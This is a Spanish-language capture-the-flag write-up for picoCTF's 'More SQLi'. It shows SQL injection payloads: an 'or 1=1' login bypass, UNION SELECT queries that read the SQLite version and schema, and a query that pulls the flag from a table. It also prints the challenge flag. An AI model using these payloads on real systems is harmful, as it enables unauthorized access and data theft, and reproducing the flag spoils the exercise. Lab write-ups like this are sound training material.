# Nombre del reto
>More SQLi

---
# Descripción
>Can you find the flag on this website.
>Try to find the flag [here](http://saturn.picoctf.net:49442/).

---
# Solución
Para este reto se debe de profundizar en algunas otras funciones de inyección SQL, para empezar, nos introducen un login, el cual podemos empezar a crackear con esta consulta en el campo de contraseña:
```sql
'or 1=1'
```
Con esto, indicamos un "soy el que buscas", siguiendo encontramos una tabla con 3 columnas, ciudades, direcciones y teléfono, esto nos indica que puede ser una unión. Ahora, si pensamos en la pista que nos dieron es: SQLiLite, entonces podemos buscar la versión en la que estamos con:
```sql
'UNION SELECT sqlite_version(),NULL, NULL;'
```
Ahora, nos dice que la versión es 3.31.1, con esto nos damos una idea de que intentar, como lo siguiente:
```sql
'UNION SELECT SQL,NULL, NULL from sqlite_master;'
```
Ahora, encontramos la estructura de las tablas:

| Estructura de cada tabla:                                                                   |
| ------------------------------------------------------------------------------------------- |
| CREATE TABLE hints (id INTEGER NOT NULL PRIMARY KEY, info TEXT)                             |
| CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)                        |
| CREATE TABLE offices (id INTEGER NOT NULL PRIMARY KEY, city TEXT, address TEXT, phone TEXT) |
| CREATE TABLE users (name TEXT NOT NULL PRIMARY KEY, password TEXT, id INTEGER)              |
En las estructuras, encontramos que en **more_table** está la columna **flag**, por lo que solo nos queda buscar esa columna con:
```sql
'union select flag,NULL,NULL from more_table'
```
Y la flag se nos mostrará en pantalla.

---
# Flag del reto
>picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a}

---
# Notas adicionales
En este caso, aunque fue raro sqlite_master nos funcionó aunque según la versión de las posibles inyecciones deberíamos de usar sqlite_schema.

---
# Referencias
[Posibles inyecciones](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md).
[Inyección SQL](https://chatgpt.com/share/69a3bc1d-e354-800b-9954-59aab1763bfb).
